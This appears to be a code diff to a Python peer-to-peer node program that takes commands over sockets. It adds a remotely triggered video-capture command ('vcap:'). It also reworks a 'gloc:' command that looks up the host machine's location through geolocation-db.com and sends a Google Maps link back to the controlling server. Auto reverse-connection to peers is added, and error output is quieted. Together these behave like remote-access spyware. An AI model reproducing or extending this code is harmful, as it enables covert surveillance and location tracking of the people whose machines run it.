@@ -17,8 +17,6 @@ import sys
 import socket
 import select
 import subprocess
-import base64
-import os
 import json
 
 from time import strftime, localtime, sleep
@@ -27,8 +25,7 @@ from base64 import b64encode, b64decode
 from dataclasses import dataclass
 
 
-from cstmcrypt.localaes import aes_encrypter
-from cstmcrypt.localrsa import rsa_encrypter
+import assets.cap as cap
 
 
 @dataclass(frozen=True)
@@ -41,23 +38,12 @@ class _Const:
 class Node:
 
     def __init__(self, ip: str, port: int) -> None:
-        passphrase = "Always the same"
-
-        rsa_crypt = rsa_encrypter(
-            user=ip,
-            passphrase=passphrase
-        )
-
         self._socket = {
             "id": str(randint(10000000, 99999999)),
             "socket": socket.socket(socket.AF_INET, socket.SOCK_STREAM),
             "ip": ip,
             "port": port,
             "type": "MASTER",
-            "meta": {
-                "rsa": rsa_crypt,
-                "aes": None
-            }
         }
         self._socket["socket"].setblocking(False)
         self._socket["socket"].setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -67,17 +53,17 @@ class Node:
 
 
 
-    def recreate_keypair(self, user: str):
-        passphrase = "Always the same"
-        d = f"cstmcrypt/RSA-keys/{user}"
+    # def recreate_keypair(self, user: str):
+    #     passphrase = "Always the same"
+    #     d = f"cstmcrypt/RSA-keys/{user}"
 
-        if os.path.exists(d):
-            os.rmdir(d)
+    #     if os.path.exists(d):
+    #         os.rmdir(d)
 
-        self._socket["meta"]["rsa"] = rsa_encrypter(
-            user=user,
-            passphrase=passphrase
-        )
+    #     self._socket["meta"]["rsa"] = rsa_encrypter(
+    #         user=user,
+    #         passphrase=passphrase
+    #     )
 
 
     #
@@ -242,10 +228,19 @@ class Node:
         })
 
         stream_in.append(sock)
-
-
         t = strftime(c.TIME_FORMAT, localtime())
-        print(f"{t} :: connected <<< {addr[0]}:{addr[1]}")
+
+        # drop master when searching
+        pairs_in_list = len([n for n in self._tcp_connections[1:] if n['id'] == node_id])
+
+        out = f"connected {'':<5}<<< {addr[0]}:{addr[1]}({pairs_in_list})"
+
+        print(f"{t} :: {out}")
+
+        if pairs_in_list < 2:
+            print(f"did not found ID pair -- reverse-connecting to node..")
+            self.connect_to_node(ip=addr[0], port=45666)
+
         return 0
 
 
@@ -299,7 +294,7 @@ class Node:
                 print(f"select error on select.socket-select(): {e.args[::-1]}")
                 return -1
             except ValueError as e:
-                print("ValueError: FD -1 -- node disconnected unexpectedly -- removing from input stream")
+                # print("ValueError: FD -1 -- node disconnected unexpectedly -- removing from input stream")
                 for s in stream_in:
                     if s.fileno() == -1:
                         stream_in.remove(s)
@@ -325,7 +320,7 @@ class Node:
                 }
 
                 if not inc:
-                    print(">>> node not found?")
+                    # print(">>> node not found?")
                     return 0
 
                 if self.is_socket_closed(s):
@@ -353,19 +348,14 @@ class Node:
                         self.dc_node(ip=inc['node']['ip'], c=c)
                         break
 
-
                     elif inc_data == "gloc:":
                         print("Geolocating...")
-                        self.geolocate(ip=inc['node']['ip'], port=inc['node']['port'])
+                        self.geolocate(ip=inc['node']['ip'])
                         continue
 
-                    elif inc_data == "key:":
-                        self.send_public_key_to_server(s=inc['node']['socket'])
+                    elif inc_data == "vcap:":
+                        self.exec_vcap()
                         continue
-
-
-
-
 
                     elif inc_data[:10] == "inc-conns:":
                         try:
@@ -396,11 +386,28 @@ class Node:
         #return 0
 
 
+    #
+    #
+    #
+    def exec_vcap(self) -> int:
+        cap_obj = cap.Vcap()
+        cap_obj.cap_video()
+        return 0
+    
+    #
+    #
+    #
+    def geolocate(self, ip: str) -> int:
 
-    #
-    #
-    #
-    def geolocate(self, ip: str, port: int) -> int :
+        def call_curl():
+            process = subprocess.Popen(
+                ["curl", "https://geolocation-db.com/json/"],
+                shell=False,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+            stdout, stderr = process.communicate()
+            return json.loads(stdout.decode('utf-8'))
 
         target = {
             "node": self._tcp_connections[node] \
@@ -409,53 +416,17 @@ class Node:
         }
         
         if not target:
-            print(f"target {ip} with type \"OUT\" doesn't exist")
+            print(f"target {ip} doesn't exist")
             return 1
 
-        def call_curl(args):
-            process = subprocess.Popen(args, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            stdout, stderr = process.communicate()
-            return json.loads(stdout.decode('utf-8'))
-
-        url = "https://geolocation-db.com/json/"
-        cmd = [
-            "curl",
-            "-vvv",
-            "-s",
-            "--socks5-hostname",
-            "127.0.0.1:9050",
-            url
-        ]
-
-        data = call_curl(cmd)
-        print(data)
-
+        data = call_curl()
         link = f"http://www.google.com/maps/place/{data['latitude']},{data['longitude']}"
-        target["node"]["socket"].send(link.encode('utf-8'))
 
+        print(f"Sending link [{link}] to server..")
+        target["node"]["socket"].send(link.encode('utf-8'))
 
         return 0
 
-
-
-    #
-    #
-    #
-    def send_public_key_to_server(self, s: socket.socket):
-        with open(self._socket["meta"]["rsa"]._pub_path, 'r') as f:
-            fcontents = f.readlines()
-            _nn = fcontents[2].split(',')[-1].strip().encode('utf-8')
-            stripped_key = ''.join(fcontents[4:-1]).encode('utf-8')
-
-        crafted_out = base64.b64encode(
-            b';;'.join([_nn, stripped_key])
-        )
-
-        # send public key
-        s.send(crafted_out)
-        
-        print(f"Public key sent -- {base64.b64decode(crafted_out)}")
-        
 
 
     #
@@ -682,43 +653,18 @@ def validate_ip_port(ip: str, port: int) -> int:
 #
 def main():
     _argc = len(sys.argv)
-    # ip:port provided
-    if _argc >= 2:
-        host = sys.argv[1].split(':')
 
-        if len(host) == 2:
-            # specified host
-            ip, port = (str(host[0]), int(host[1]))
-        elif len(host) == 1:
-            # default host
-            ip, port = (str(socket.gethostbyname(socket.gethostname())), int(host[0]))
-        else:
-            print(f"invalid host (ip:port): {host}")
-            exit(1)
+    ip, port = (str(socket.gethostbyname(socket.gethostname())), int(sys.argv[1])) \
+        if _argc == 2 \
+            else (str(socket.gethostbyname(socket.gethostname())), 45666)
 
-        if validate_ip_port(ip, port) != 0:
-            print(f"invalid host (ip:port): {host}")
-            exit(1)
-
-        # initial target provided
-        if _argc == 3:
-            rn_0 = sys.argv[2].split(':')
-            ip_0, port_0 = (str(rn_0[0]), int(rn_0[1]))
-        else:
-            ip_0, port_0 = (None, None)
-
-    # no args
+    if _argc == 3:
+        # initial target provided    
+        rn_0 = sys.argv[2].split(':')
+        ip_0, port_0 = (str(rn_0[0]), int(rn_0[1]))
     else:
-        default_port = 45666
         ip_0, port_0 = (None, None)
 
-        if _argc == 1:
-            # assign default host ip & port
-            ip, port = (str(socket.gethostbyname(socket.gethostname())), default_port)
-            print(f"ip:port not provided >>> using default host ip with default port >>> {ip}:{port}")
-        else:
-            print("invalid arguments")
-            exit(1)
 
     n = Node(ip, port)
     c = _Const()
